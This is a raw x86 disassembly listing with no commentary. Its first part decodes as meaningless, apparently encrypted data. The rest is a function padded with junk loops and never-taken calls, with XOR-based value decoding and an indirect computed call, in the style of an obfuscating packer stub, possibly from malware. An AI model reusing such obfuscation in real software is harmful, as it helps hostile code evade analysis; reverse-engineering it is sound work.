  414bbb:	js     0x414c35
  414bbd:	fmul   DWORD PTR [ecx+0x1225dcdd]
  414bc3:	popf   
  414bc4:	hlt    
  414bc5:	xlat   BYTE PTR ds:[ebx]
  414bc6:	aas    
  414bc7:	pop    esp
  414bc8:	jmp    0xbf18cc9b
  414bcd:	push   ebp
  414bce:	inc    ecx
  414bcf:	clc    
  414bd0:	into   
  414bd1:	push   ebp
  414bd2:	ds out dx,al
  414bd4:	xor    esi,DWORD PTR [edi-0x4c63fa98]
  414bda:	ins    DWORD PTR es:[edi],dx
  414bdb:	mov    ebx,0x2a8eba53
  414be0:	aam    0xbb
  414be2:	aas    
  414be3:	sub    DWORD PTR [esi-0x3c9c8ae4],ebx
  414be9:	and    eax,0xda488721
  414bee:	(bad)  
  414bef:	mov    eax,0x333ef6d0
  414bf4:	push   cs
  414bf5:	loopne 0x414bb6
  414bf7:	out    0x2f,al
  414bf9:	jns    0x414bad
  414bfb:	pop    eax
  414bfc:	dec    edx
  414bfd:	(bad)  
  414bfe:	mov    ah,0xcd
  414c00:	pop    esp
  414c01:	loopne 0x414c73
  414c03:	cmp    BYTE PTR [esi+0x153754f5],dl
  414c09:	clc    
  414c0a:	out    dx,eax
  414c0b:	ret    
  414c0c:	xor    ebx,DWORD PTR [ebx+0xa]
  414c0f:	xchg   ecx,eax
  414c10:	sbb    DWORD PTR [ebx+0x76],ebx
  414c13:	icebp  
  414c14:	cwde   
  414c15:	jne    0x414bcd
  414c17:	mov    al,ds:0xab8491d7
  414c1c:	add    bl,ch
  414c1e:	sbb    ch,BYTE PTR [esi+0x13]
  414c21:	mov    BYTE PTR [eax-0x54],cl
  414c24:	data16 jmp 0x414c2e
  414c27:	sti    
  414c28:	mov    ss:0xbacd44f6,al
  414c2e:	push   0xcf76184e
  414c33:	push   edx
  414c34:	inc    ebp
  414c35:	pop    ss
  414c36:	mov    esp,0xb8824ef6
  414c3b:	std    
  414c3c:	sbb    eax,0xc400a46e
  414c41:	outs   dx,BYTE PTR ds:[esi]
  414c42:	push   0x5e
  414c44:	xor    BYTE PTR [ebx],ah
  414c46:	lods   eax,DWORD PTR ds:[esi]
  414c47:	call   0x780b1789
  414c4c:	fadd   QWORD PTR [edx]
  414c4e:	jne    0x414cb8
  414c50:	adc    dl,dh
  414c52:	(bad)  
  414c53:	sti    
  414c54:	mov    eax,0xf7f13927
  414c59:	fsub   DWORD PTR [esp+edx*8-0x1b]
  414c5d:	pop    ebx
  414c5e:	cmp    DWORD PTR [esi],edx
  414c60:	push   ebx
  414c61:	dec    esp
  414c62:	js     0x414c93
  414c64:	mov    dh,0x85
  414c66:	shr    DWORD PTR [edi+ecx*1],1
  414c69:	jmp    0x414c5b
  414c6b:	(bad)  
  414c6c:	pop    edx
  414c6d:	push   0xfcfe6c6d
  414c72:	(bad)  
  414c73:	and    eax,edi
  414c75:	pop    ss
  414c76:	mov    ds:0xe033066b,eax
  414c7b:	and    DWORD PTR [ebp-0x66a06bf2],esi
  414c81:	push   cs
  414c82:	dec    ecx
  414c83:	push   cs
  414c84:	cmp    dl,BYTE PTR [esi]
  414c86:	sub    eax,0x43943faf
  414c8b:	xchg   ebp,eax
  414c8c:	enter  0xb90b,0x59
  414c90:	loope  0x414cd9
  414c92:	fst    QWORD PTR [esi]
  414c94:	imul   DWORD PTR [edx]
  414c96:	jmp    0xef0452f2
  414c9b:	mov    ds:0x38d84174,eax
  414ca0:	mov    WORD PTR [eax-0x1e39ec3e],gs
  414ca6:	shl    eax,0x5b
  414ca9:	cwde   
  414caa:	aas    
  414cab:	gs getsec 
  414cae:	iret   
  414caf:	shl    DWORD PTR [esi+0x568c8b6],1
  414cb5:	sbb    eax,DWORD PTR [esp+esi*2+0x1b029f7]
  414cbc:	fwait
  414cbd:	dec    edi
  414cbe:	lock push ebp
  414cc0:	fsubr  DWORD PTR [ebx]
  414cc2:	inc    edi
  414cc3:	xor    edi,DWORD PTR [ebp+0x5179ae0d]
  414cc9:	xchg   ebx,eax
  414cca:	jl     0x414c88
  414ccc:	daa    
  414ccd:	call   FWORD PTR [edx+edi*8-0x6cc7f9c1]
  414cd4:	ja     0x414d07
  414cd6:	xchg   esi,eax
  414cd7:	out    0x2c,al
  414cd9:	xchg   ecx,eax
  414cda:	outs   dx,DWORD PTR ds:[esi]
  414cdb:	rep stos BYTE PTR es:[edi],al
  414cdd:	mov    eax,0x3cc45145
  414ce2:	dec    ebp
  414ce3:	jo     0x414cdb
  414ce5:	mov    al,BYTE PTR [esi]
  414ce7:	out    dx,al
  414ce8:	lods   eax,DWORD PTR ds:[esi]
  414ce9:	leave  
  414cea:	ficomp WORD PTR [edx+0x497e402a]
  414cf0:	icebp  
  414cf1:	jnp    0x414d38
  414cf3:	cld    
  414cf4:	push   esi
  414cf5:	leave  
  414cf6:	mov    ds:0x15cba68a,al
  414cfb:	cmp    eax,0xbadedd6f
  414d00:	sti    
  414d01:	or     BYTE PTR [esp+edi*4],dh
  414d04:	popa   
  414d05:	pop    eax
  414d06:	cmc    
  414d07:	mov    al,ds:0x622ef2ca
  414d0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d0d:	call   0xb19967db
  414d12:	adc    BYTE PTR [edx],al
  414d14:	(bad)  
  414d16:	stc    
  414d17:	xor    DWORD PTR [ebx+0x4],edx
  414d1a:	or     DWORD PTR [ecx+edx*8+0x521c435b],esp
  414d21:	(bad)  
  414d22:	push   ecx
  414d23:	and    eax,0x987a8ded
  414d28:	and    al,0xe5
  414d2a:	outs   dx,BYTE PTR ds:[esi]
  414d2b:	jmp    0xfe7a83a6
  414d30:	push   ss
  414d31:	xchg   DWORD PTR [eax-0x2e],eax
  414d34:	and    edi,ecx
  414d36:	nop
  414d37:	mov    ebp,0x5ecbd0e0
  414d3c:	push   cs
  414d3d:	mov    cl,0x93
  414d3f:	xchg   BYTE PTR [edx],bl
  414d41:	iret   
  414d42:	xor    BYTE PTR [ebx+edx*2-0x52],bl
  414d46:	jge    0x414dc7
  414d48:	or     dh,BYTE PTR [edx-0x3a]
  414d4b:	pop    ebp
  414d4c:	std    
  414d4d:	sub    dl,cl
  414d4f:	jmp    0xf483f0f4
  414d54:	test   eax,0xb7f509f0
  414d59:	mov    ch,0xcd
  414d5b:	in     al,0x9
  414d5d:	dec    esp
  414d5e:	jp     0x414d68
  414d60:	or     BYTE PTR [ecx],0x98
  414d63:	xor    BYTE PTR [ecx+0x53],ch
  414d66:	sub    al,0x97
  414d68:	loop   0x414d2f
  414d6a:	or     dl,BYTE PTR [edi]
  414d6c:	dec    ebp
  414d6d:	bound  edi,QWORD PTR [ebx+0x5d2aa0b2]
  414d73:	ror    BYTE PTR [ebx+ebx*2],1
  414d76:	jmp    0xf1b09c83
  414d7b:	clc    
  414d7c:	pop    edx
  414d7d:	jnp    0x414dcf
  414d7f:	adc    BYTE PTR [edi],dh
  414d81:	push   es
  414d82:	cmp    DWORD PTR [ebp-0x3e9d076b],0x52
  414d89:	ins    BYTE PTR es:[edi],dx
  414d8a:	repnz add edx,ebp
  414d8d:	and    eax,0x24365dd9
  414d92:	adc    bl,BYTE PTR ds:0xda3d1cee
  414d98:	addr16 inc sp
  414d9b:	das    
  414d9c:	and    DWORD PTR [edi],esp
  414d9e:	sbb    ch,BYTE PTR [edx]
  414da0:	xor    DWORD PTR [esp+esi*4+0x17],eax
  414da4:	jmp    0x862610c7
  414da9:	inc    eax
  414dab:	jg     0x414ddb
  414dad:	add    edx,eax
  414daf:	rcl    DWORD PTR [esi+0x660ea52],1
  414db5:	jmp    0x6592:0xb1d44e53
  414dbc:	imul   edx,ebx,0xffffffbb
  414dbf:	dec    edi
  414dc0:	pop    esp
  414dc1:	adc    al,0x6
  414dc3:	sbb    eax,0xfa41a9d6
  414dc8:	out    dx,al
  414dc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dca:	(bad)  
  414dcb:	xor    DWORD PTR [eax],esp
  414dcd:	push   ss
  414dce:	mov    ecx,DWORD PTR [edx-0x59]
  414dd1:	cmp    DWORD PTR [ebx+0x553918c3],0x26
  414dd8:	dec    edx
  414dd9:	outs   dx,DWORD PTR ds:[esi]
  414dda:	xor    BYTE PTR [eax+0xd],ch
  414ddd:	sub    DWORD PTR [esi],edi
  414ddf:	push   ebp
  414de0:	dec    ecx
  414de1:	sbb    dh,BYTE PTR [ebp+0x49]
  414de4:	popa   
  414de5:	mov    eax,ds:0x4956baf
  414dea:	and    eax,0x2077b245
  414def:	test   dl,ah
  414df1:	add    BYTE PTR [ecx-0x79],bh
  414df4:	inc    ecx
  414df5:	mov    esi,0x74e9ce6a
  414dfa:	sub    eax,0xa91b4d17
  414dff:	out    dx,eax
  414e00:	repz hlt 
  414e02:	sahf   
  414e03:	mov    dh,0x59
  414e05:	inc    esi
  414e06:	jmp    0x7236:0x243994ff
  414e0d:	scas   al,BYTE PTR es:[edi]
  414e0e:	faddp  st(5),st
  414e10:	es ins BYTE PTR es:[edi],dx
  414e12:	add    al,0x44
  414e14:	jns    0x414e8d
  414e16:	cmp    ah,BYTE PTR [eax+eax*1+0x2202ed9d]
  414e1d:	mov    dl,0x30
  414e1f:	jl     0x414e74
  414e21:	out    0xf9,eax
  414e23:	call   0x6adae80e
  414e28:	jbe    0x40fa94
  414e2e:	pop    ebx
  414e2f:	pop    edi
  414e30:	leave  
  414e31:	ret    0x8
  414e34:	push   ebp
  414e35:	mov    ebp,esp
  414e37:	sub    esp,0xa8
  414e3d:	movzx  eax,WORD PTR ds:0x42aa55
  414e44:	xor    DWORD PTR ds:0x42a9d1,eax
  414e4a:	push   ebx
  414e4b:	and    DWORD PTR ds:0x42aa19,0x2f2e
  414e55:	push   esi
  414e56:	and    DWORD PTR ds:0x42aaa1,0x0
  414e60:	jmp    0x414e70
  414e65:	mov    eax,ds:0x42aaa1
  414e6a:	inc    eax
  414e6b:	mov    ds:0x42aaa1,eax
  414e70:	cmp    DWORD PTR ds:0x42aaa1,0x10
  414e77:	jae    0x414ea3
  414e7d:	cmp    DWORD PTR ds:0x42aaa1,0x12
  414e84:	jne    0x414e9e
  414e8a:	push   DWORD PTR [ebp-0x1c]
  414e8d:	push   DWORD PTR [ebp-0x10]
  414e90:	push   DWORD PTR [ebp-0x10]
  414e93:	push   0x5267
  414e98:	call   DWORD PTR ds:0x41d260
  414e9e:	jmp    0x414e65
  414ea3:	push   edi
  414ea4:	xor    esi,esi
  414ea6:	add    ecx,DWORD PTR ds:0x42aaad
  414eac:	push   0x0
  414eae:	push   0x19
  414eb0:	xor    ecx,eax
  414eb2:	pop    ecx
  414eb3:	or     eax,0x2a9a
  414eb8:	xor    edx,edx
  414eba:	sub    eax,DWORD PTR ds:0x42aa61
  414ec0:	mov    eax,esi
  414ec2:	div    ecx
  414ec4:	push   edx
  414ec5:	sbb    DWORD PTR ds:0x42aa59,0x42aa91
  414ecf:	call   DWORD PTR ds:0x41d400
  414ed5:	mov    DWORD PTR ds:0x42aa61,0x6c20
  414edf:	inc    esi
  414ee0:	mov    DWORD PTR ds:0x42aa95,0x23c0
  414eea:	cmp    esi,0x1000
  414ef0:	jb     0x414ea6
  414ef6:	mov    DWORD PTR [ebp-0x24],0xf89c8538
  414efd:	inc    DWORD PTR ds:0x42a9d5
  414f03:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  414f0a:	lea    eax,[ebp-0x2c]
  414f0d:	inc    ecx
  414f0e:	mov    DWORD PTR [ebp-0x18],eax
  414f11:	and    DWORD PTR ds:0x42aaa5,0x42a9c5
  414f1b:	lea    eax,[ebp-0x30]
  414f1e:	xor    DWORD PTR ds:0x42aa11,0x42aaa1
  414f28:	mov    DWORD PTR [ebp-0x14],eax
  414f2b:	or     DWORD PTR ds:0x42aa61,edi
  414f31:	mov    eax,ds:0x41eae6
  414f36:	add    DWORD PTR ds:0x42a9c9,ebx
  414f3c:	mov    eax,DWORD PTR [eax+0x1c8]
  414f42:	mov    eax,DWORD PTR [eax]
  414f44:	and    DWORD PTR ds:0x42aa5d,0x0
  414f4e:	jmp    0x414f60
  414f53:	mov    edi,DWORD PTR ds:0x42aa5d
  414f59:	inc    edi
  414f5a:	mov    DWORD PTR ds:0x42aa5d,edi
  414f60:	cmp    DWORD PTR ds:0x42aa5d,0x11
  414f67:	jae    0x414fb6
  414f6d:	cmp    DWORD PTR ds:0x42aa5d,0x4
  414f74:	jne    0x414f8d
  414f7a:	push   0x73af
  414f7f:	push   0x42aa69
  414f84:	push   DWORD PTR [ebp-0x18]
  414f87:	call   DWORD PTR ds:0x41d264
  414f8d:	cmp    DWORD PTR ds:0x42aa5d,0x3
  414f94:	jne    0x414fa7
  414f9a:	mov    edi,DWORD PTR ds:0x42aa5d
  414fa0:	inc    edi
  414fa1:	mov    DWORD PTR ds:0x42aa5d,edi
  414fa7:	jmp    0x414f53
  414fac:	mov    DWORD PTR ds:0x42aa15,0x500e
  414fb6:	mov    ecx,DWORD PTR [ebp-0x14]
  414fb9:	and    DWORD PTR ds:0x42aa29,0x1370
  414fc3:	mov    esi,0x7510850
  414fc8:	xor    ebx,DWORD PTR ds:0x42a9cd
  414fce:	xor    eax,esi
  414fd0:	xor    edi,edi
  414fd2:	mov    edi,0x327298
  414fd7:	sub    DWORD PTR ds:0x42aaa5,ebx
  414fdd:	add    eax,edi
  414fdf:	mov    DWORD PTR [ecx],eax
  414fe1:	mov    DWORD PTR ds:0x42aaa9,edi
  414fe7:	mov    eax,ds:0x41ed1a
  414fec:	movzx  ebx,BYTE PTR ds:0x42aa19
  414ff3:	cmp    eax,0x22c02f45
  414ff8:	mov    eax,DWORD PTR [ebp-0x4]
  414ffb:	mov    DWORD PTR ds:0x42aa65,edi
  415001:	mov    ebx,0xf89c853c
  415006:	mov    DWORD PTR ds:0x42aaa5,0x1488
  415010:	je     0x4150a4
  415016:	and    DWORD PTR ds:0x42aaa9,0x0
  415020:	jmp    0x415032
  415025:	mov    ecx,DWORD PTR ds:0x42aaa9
  41502b:	inc    ecx
  41502c:	mov    DWORD PTR ds:0x42aaa9,ecx
  415032:	cmp    DWORD PTR ds:0x42aaa9,0x13
  415039:	jae    0x41506a
  41503f:	cmp    DWORD PTR ds:0x42aaa9,0x15
  415046:	jne    0x41505f
  41504c:	push   DWORD PTR [ebp-0xc]
  41504f:	push   0x7b08
  415054:	push   0x10eb
  415059:	call   DWORD PTR ds:0x41d268
  41505f:	jmp    0x415025
  415064:	or     ecx,DWORD PTR ds:0x42aad1
  41506a:	mov    ecx,DWORD PTR [ebp-0x24]
  41506d:	xor    eax,esi
  41506f:	xor    DWORD PTR ds:0x42aa51,0x57fa
  415079:	add    eax,edi
  41507b:	add    DWORD PTR ds:0x42aae5,0x42aa15
  415085:	imul   eax,ecx
  415088:	mov    DWORD PTR ds:0x42aa21,0x7c29
  415092:	mov    DWORD PTR [ebp-0x24],eax
  415095:	mov    DWORD PTR ds:0x42aa25,0x1f8
  41509f:	jmp    0x4152c1
  4150a4:	and    DWORD PTR ds:0x42aad9,0x0
  4150ae:	mov    ecx,DWORD PTR ds:0x42aad9
  4150b4:	inc    ecx
  4150b5:	mov    DWORD PTR ds:0x42aad9,ecx
  4150bb:	cmp    DWORD PTR ds:0x42aad9,0x2a
  4150c2:	jne    0x4150d1
  4150c8:	push   DWORD PTR [ebp-0x24]
  4150cb:	call   DWORD PTR ds:0x41d26c
  4150d1:	cmp    DWORD PTR ds:0x42aad9,0x1c
  4150d8:	jb     0x4150ae
  4150de:	movzx  ecx,BYTE PTR ds:0x42aa9d
  4150e5:	xor    ecx,DWORD PTR ds:0x42aaad
  4150eb:	mov    DWORD PTR ds:0x42aa9d,ecx
  4150f1:	xor    eax,esi
  4150f3:	add    eax,edi
  4150f5:	and    DWORD PTR ds:0x42aa11,edi
  4150fb:	mov    ds:0x41ebfa,eax
  415100:	neg    DWORD PTR ds:0x42aa51
  415106:	mov    eax,DWORD PTR [ebp-0x24]
  415109:	and    DWORD PTR ds:0x42aad5,0x0
  415113:	mov    ecx,DWORD PTR ds:0x42aad5
  415119:	inc    ecx
  41511a:	mov    DWORD PTR ds:0x42aad5,ecx
  415120:	cmp    DWORD PTR ds:0x42aad5,0x29
  415127:	jne    0x415138
  41512d:	push   0x548b
  415132:	call   DWORD PTR ds:0x41d0e4
  415138:	cmp    DWORD PTR ds:0x42aad5,0x1c
  41513f:	jb     0x415113
  415145:	and    DWORD PTR ds:0x42a9bd,0x0
  41514f:	xor    ecx,ecx
  415151:	add    ecx,DWORD PTR ds:0x42a9bd
  415157:	inc    ecx
  415158:	mov    DWORD PTR ds:0x42a9bd,ecx
  41515e:	cmp    DWORD PTR ds:0x42a9bd,0xe
  415165:	jne    0x415176
  41516b:	push   0x42abff
  415170:	call   DWORD PTR ds:0x41d0e8
  415176:	cmp    DWORD PTR ds:0x42a9bd,0xd
  41517d:	jne    0x415190
  415183:	mov    ecx,DWORD PTR ds:0x42a9bd
  415189:	inc    ecx
  41518a:	mov    DWORD PTR ds:0x42a9bd,ecx
  415190:	cmp    DWORD PTR ds:0x42a9bd,0x17
  415197:	jb     0x41514f
  41519d:	or     ecx,DWORD PTR ds:0x42a9e1
  4151a3:	xor    eax,esi
  4151a5:	and    DWORD PTR ds:0x42aa21,0x0
  4151af:	jmp    0x4151c1
  4151b4:	mov    ecx,DWORD PTR ds:0x42aa21
  4151ba:	inc    ecx
  4151bb:	mov    DWORD PTR ds:0x42aa21,ecx
  4151c1:	cmp    DWORD PTR ds:0x42aa21,0x11
  4151c8:	jae    0x415217
  4151ce:	cmp    DWORD PTR ds:0x42aa21,0x9
  4151d5:	jne    0x4151f4
  4151db:	push   0x577c
  4151e0:	push   DWORD PTR [ebp-0x18]
  4151e3:	push   0x838a
  4151e8:	push   DWORD PTR [ebp-0x10]
  4151eb:	push   DWORD PTR [ebp-0x28]
  4151ee:	call   DWORD PTR ds:0x41d0ec
  4151f4:	cmp    DWORD PTR ds:0x42aa21,0x8
  4151fb:	jne    0x415210
  415201:	xor    ecx,ecx
  415203:	xor    ecx,DWORD PTR ds:0x42aa21
  415209:	inc    ecx
  41520a:	mov    DWORD PTR ds:0x42aa21,ecx
  415210:	jmp    0x4151b4
  415215:	not    ecx
  415217:	add    eax,edi
  415219:	and    DWORD PTR ds:0x42aa29,0x0
  415223:	mov    ecx,DWORD PTR ds:0x42aa29
  415229:	inc    ecx
  41522a:	mov    DWORD PTR ds:0x42aa29,ecx
  415230:	cmp    DWORD PTR ds:0x42aa29,0x26
  415237:	jne    0x41524b
  41523d:	push   DWORD PTR [ebp-0x20]
  415240:	push   0x2236
  415245:	call   DWORD PTR ds:0x41d270
  41524b:	cmp    DWORD PTR ds:0x42aa29,0x16
  415252:	jb     0x415223
  415258:	mov    ds:0x41ed1a,eax
  41525d:	add    ecx,DWORD PTR ds:0x42a9d5
  415263:	mov    eax,DWORD PTR [ebp-0x4]
  415266:	mov    ecx,DWORD PTR ds:0x41ebfa
  41526c:	xor    eax,esi
  41526e:	xor    DWORD PTR ds:0x42aa29,0x42aae1
  415278:	add    eax,edi
  41527a:	mov    DWORD PTR ds:0x42aad1,0x2781
  415284:	cmp    ecx,eax
  415286:	mov    DWORD PTR ds:0x42aaa1,0x2b32
  415290:	jne    0x4152c1
  415296:	mov    DWORD PTR ds:0x42aa99,0x7717
  4152a0:	push   ebx
  4152a1:	sub    DWORD PTR ds:0x42a9c5,0x42aadd
  4152ab:	push   DWORD PTR [ebp-0x4]
  4152ae:	push   DWORD PTR [ebp-0x24]
  4152b1:	sub    DWORD PTR ds:0x42aa9d,0x42a9b9
  4152bb:	call   DWORD PTR ds:0x41ebf2
  4152c1:	mov    eax,ds:0x41eae6
  4152c6:	mov    eax,DWORD PTR [eax+0x18c]
  4152cc:	mov    eax,DWORD PTR [eax]
  4152ce:	mov    DWORD PTR [ebp-0x44],eax
  4152d1:	mov    DWORD PTR [ebp-0x10],ebx
  4152d4:	and    DWORD PTR ds:0x42aa2d,0x0
  4152de:	jmp    0x4152f0
  4152e3:	mov    ecx,DWORD PTR ds:0x42aa2d
  4152e9:	inc    ecx
  4152ea:	mov    DWORD PTR ds:0x42aa2d,ecx
  4152f0:	cmp    DWORD PTR ds:0x42aa2d,0x1a
  4152f7:	jae    0x4153d6
  4152fd:	cmp    DWORD PTR ds:0x42aa2d,0x24
  415304:	jne    0x41531a
  41530a:	push   0x42aaa9
  41530f:	push   0x28eb
  415314:	call   DWORD PTR ds:0x41d0f0
  41531a:	jmp    0x4152e3
  41531f:	mov    DWORD PTR ds:0x42a9e1,0x10
  415329:	cmp    DWORD PTR ds:0x42a9e1,0x0
  415330:	je     0x4153d6
  415336:	cmp    DWORD PTR ds:0x42a9e1,0x7
  41533d:	jne    0x415351
  415343:	push   0x572d
  415348:	push   DWORD PTR [ebp-0xc]
  41534b:	call   DWORD PTR ds:0x41d0f4
  415351:	cmp    DWORD PTR ds:0x42a9e1,0x8
  415358:	jne    0x41536d
  41535e:	xor    edx,edx
  415360:	add    edx,DWORD PTR ds:0x42a9e1
  415366:	dec    edx
  415367:	mov    DWORD PTR ds:0x42a9e1,edx
  41536d:	mov    edx,DWORD PTR ds:0x42a9e1
  415373:	dec    edx
  415374:	mov    DWORD PTR ds:0x42a9e1,edx
  41537a:	jmp    0x415329
  41537f:	and    DWORD PTR ds:0x42aa51,0x0
  415389:	jmp    0x415399
  41538e:	mov    eax,ds:0x42aa51
  415393:	inc    eax
  415394:	mov    ds:0x42aa51,eax
  415399:	cmp    DWORD PTR ds:0x42aa51,0x13
  4153a0:	jae    0x4153d6
  4153a6:	cmp    DWORD PTR ds:0x42aa51,0x1b
  4153ad:	jne    0x4153cb
  4153b3:	push   0x3cd6
  4153b8:	push   0x42a9b9
  4153bd:	push   DWORD PTR [ebp-0x1c]
  4153c0:	push   0x865d
  4153c5:	call   DWORD PTR ds:0x41d0f8
  4153cb:	jmp    0x41538e
  4153d0:	or     DWORD PTR ds:0x42aa1d,ecx
  4153d6:	mov    DWORD PTR [ebp-0x10],ebx
  4153d9:	mov    DWORD PTR [ebp-0x10],ebx
  4153dc:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  4153e3:	and    DWORD PTR ds:0x42aa91,0x0
  4153ed:	mov    eax,ds:0x42aa91
  4153f2:	inc    eax
  4153f3:	mov    ds:0x42aa91,eax
  4153f8:	cmp    DWORD PTR ds:0x42aa91,0xc
  4153ff:	jne    0x415416
  415405:	push   DWORD PTR [ebp-0x24]
  415408:	push   DWORD PTR [ebp-0x24]
  41540b:	push   0x42ab92
  415410:	call   DWORD PTR ds:0x41d0fc
  415416:	cmp    DWORD PTR ds:0x42aa91,0xb
  41541d:	jne    0x415431
  415423:	xor    eax,eax
  415425:	xor    eax,DWORD PTR ds:0x42aa91
  41542b:	inc    eax
  41542c:	mov    ds:0x42aa91,eax
  415431:	cmp    DWORD PTR ds:0x42aa91,0x17
  415438:	jb     0x4153ed
  41543e:	adc    DWORD PTR ds:0x42a9c1,ecx
  415444:	mov    DWORD PTR [ebp-0x10],ebx
  415447:	mov    DWORD PTR [ebp-0x10],0xf89c8520
  41544e:	and    ecx,eax
  415450:	mov    eax,DWORD PTR [ebp-0x24]
  415453:	mov    DWORD PTR ds:0x42aaed,0x1d
  41545d:	cmp    DWORD PTR ds:0x42aaed,0x0
  415464:	je     0x4154d3
  41546a:	cmp    DWORD PTR ds:0x42aaed,0xe
  415471:	jne    0x415495
  415477:	push   DWORD PTR [ebp-0x1c]
  41547a:	push   0x42a9c9
  41547f:	push   DWORD PTR [ebp-0x14]
  415482:	push   0x4571
  415487:	push   0x5504
  41548c:	push   DWORD PTR [ebp-0x24]
  41548f:	call   DWORD PTR ds:0x41d100
  415495:	cmp    DWORD PTR ds:0x42aaed,0xf
  41549c:	jne    0x4154af
  4154a2:	mov    edx,DWORD PTR ds:0x42aaed
  4154a8:	dec    edx
  4154a9:	mov    DWORD PTR ds:0x42aaed,edx
  4154af:	mov    edx,DWORD PTR ds:0x42aaed
  4154b5:	dec    edx
  4154b6:	mov    DWORD PTR ds:0x42aaed,edx
  4154bc:	jmp    0x41545d
  4154c1:	mov    edx,DWORD PTR ds:0x42aa19
  4154c7:	and    edx,DWORD PTR ds:0x42aaad
  4154cd:	mov    DWORD PTR ds:0x42aa19,edx
  4154d3:	mov    ecx,DWORD PTR [ebp-0x4]
  4154d6:	and    DWORD PTR ds:0x42a9e1,0x65ac
  4154e0:	mov    edx,DWORD PTR [ebp-0x4]
  4154e3:	add    DWORD PTR ds:0x42aa95,0x42aa51
  4154ed:	xor    edx,esi
  4154ef:	xor    DWORD PTR ds:0x42aa95,0x571
  4154f9:	xor    ecx,esi
  4154fb:	add    ecx,edx
  4154fd:	mov    edx,DWORD PTR [ebp-0x4]
  415500:	xor    eax,esi
  415502:	or     DWORD PTR ds:0x42aa25,0x42aa65
  41550c:	xor    edx,esi
  41550e:	add    eax,edi
  415510:	lea    ecx,[ecx+edx*1+0x9757c8]
  415517:	mov    DWORD PTR ds:0x42aa55,0x1d99
  415521:	mov    DWORD PTR [ebp-0x20],eax
  415524:	mov    DWORD PTR ds:0x42a9c1,0x9d6
  41552e:	cmp    eax,ecx
  415530:	ja     0x415630
  415536:	jmp    0x415589
  41553b:	and    DWORD PTR ds:0x42aa1d,0x0
  415545:	mov    ecx,DWORD PTR ds:0x42aa1d
  41554b:	inc    ecx
  41554c:	mov    DWORD PTR ds:0x42aa1d,ecx
  415552:	cmp    DWORD PTR ds:0x42aa1d,0x21
  415559:	jne    0x415577
  41555f:	push   DWORD PTR [ebp-0x14]
  415562:	push   0x42aaa5
  415567:	push   0x6e14
  41556c:	push   0x8733
  415571:	call   DWORD PTR ds:0x41d104
  415577:	cmp    DWORD PTR ds:0x42aa1d,0x12
  41557e:	jb     0x415545
  415584:	sbb    eax,ecx
  415586:	mov    eax,DWORD PTR [ebp-0x20]
  415589:	and    DWORD PTR ds:0x42aadd,0x0
  415593:	jmp    0x4155a7
  415598:	xor    ecx,ecx
  41559a:	add    ecx,DWORD PTR ds:0x42aadd
  4155a0:	inc    ecx
  4155a1:	mov    DWORD PTR ds:0x42aadd,ecx
  4155a7:	cmp    DWORD PTR ds:0x42aadd,0x1c
  4155ae:	jae    0x4155d4
  4155b4:	cmp    DWORD PTR ds:0x42aadd,0x21
  4155bb:	jne    0x4155cf
  4155c1:	push   0x6aa9
  4155c6:	push   DWORD PTR [ebp-0x24]
  4155c9:	call   DWORD PTR ds:0x41d108
  4155cf:	jmp    0x415598
  4155d4:	mov    ecx,DWORD PTR [ebp-0x4]
  4155d7:	xor    ecx,esi
  4155d9:	lea    eax,[ecx+eax*1+0x327298]
  4155e0:	push   eax
  4155e1:	mov    eax,DWORD PTR [ebp-0x14]
  4155e4:	xor    eax,esi
  4155e6:	lea    eax,[ebp+eax*1+0x3272a0]
  4155ed:	push   eax
  4155ee:	mov    eax,ds:0x41eae6
  4155f3:	push   DWORD PTR [eax+0x1bc]
  4155f9:	call   0x4043a1
  4155fe:	mov    eax,DWORD PTR [ebp-0x4]
  415601:	mov    ecx,DWORD PTR [ebp-0x20]
  415604:	xor    eax,esi
  415606:	lea    eax,[ecx+eax*1+0x327298]
  41560d:	mov    ecx,DWORD PTR [ebp-0x4]
  415610:	mov    edx,DWORD PTR [ebp-0x4]
  415613:	xor    edx,esi
  415615:	xor    ecx,esi
  415617:	add    ecx,edx
  415619:	mov    edx,DWORD PTR [ebp-0x4]
  41561c:	xor    edx,esi
  41561e:	lea    ecx,[ecx+edx*1+0x9757c8]
  415625:	mov    DWORD PTR [ebp-0x20],eax
  415628:	cmp    eax,ecx
  41562a:	jbe    0x41553b
  415630:	mov    eax,DWORD PTR [ebp+0xc]
  415633:	mov    ds:0x41e96a,eax
  415638:	mov    eax,DWORD PTR [ebp+0x10]
  41563b:	mov    ds:0x41ebbe,eax
  415640:	mov    eax,ds:0x41e96a
  415645:	mov    ecx,DWORD PTR [ebp-0x18]
  415648:	push   DWORD PTR [ebp-0x44]
  41564b:	sub    eax,edi
  41564d:	push   DWORD PTR [ebp-0x30]
  415650:	xor    eax,esi
  415652:	mov    DWORD PTR [ecx],eax
  415654:	push   DWORD PTR [ebp-0x2c]
  415657:	call   0x41594a
  41565c:	sub    eax,edi
  41565e:	xor    eax,esi
  415660:	mov    DWORD PTR [ebp+0xc],eax
  415663:	mov    ecx,DWORD PTR [ebp-0x4]
  415666:	mov    eax,DWORD PTR [ebp+0xc]
  415669:	xor    ecx,esi
  41566b:	add    ecx,edi
  41566d:	xor    edx,edx
  41566f:	div    ecx
  415671:	mov    ecx,DWORD PTR [ebp-0x24]
  415674:	cmp    ecx,eax
  415676:	jne    0x41589f
  41567c:	mov    eax,ds:0x41eae6
  415681:	mov    DWORD PTR [ebp+0x10],eax
  415684:	mov    eax,ds:0x41ebf6
  415689:	mov    DWORD PTR [ebp-0x50],eax
  41568c:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  415693:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  41569a:	mov    DWORD PTR [ebp-0x4c],0xf89cb538
  4156a1:	mov    DWORD PTR [ebp-0x64],0xf89f0538
  4156a8:	mov    DWORD PTR [ebp-0x60],0xf89c85f8
  4156af:	mov    DWORD PTR [ebp-0x54],0xf89c85d8
  4156b6:	mov    eax,DWORD PTR [ebp-0x18]
  4156b9:	xor    eax,esi
  4156bb:	add    eax,edi
  4156bd:	mov    DWORD PTR [ebp-0xc],eax
  4156c0:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  4156c7:	mov    BYTE PTR [ebp-0x25],0x67
  4156cb:	mov    eax,DWORD PTR [ebp-0x18]
  4156ce:	xor    eax,esi
  4156d0:	add    eax,edi
  4156d2:	mov    DWORD PTR [ebp-0xc],eax
